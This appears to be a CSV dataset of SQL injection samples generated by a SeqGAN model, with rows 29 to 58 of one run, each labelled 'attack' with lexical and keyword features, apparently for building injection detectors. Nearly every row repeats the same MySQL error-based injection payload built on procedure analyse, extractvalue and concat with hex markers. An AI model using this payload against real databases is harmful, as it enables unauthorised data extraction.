label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,29,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,30,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,31,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,32,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,33,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,34,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,35,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,36,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,37,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,38,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,39,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,40,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,41,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,42,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,43,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,44,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,45,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,46,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,47,196.0,31.0,3.919702517953865,69.0,37.0,68.0,22.0,0.3520408163265306,0.18877551020408162,0.3469387755102041,0.11224489795918367,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,48,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,49,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,50,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,51,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,52,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,53,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,54,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,55,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,56,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,57,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,58,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
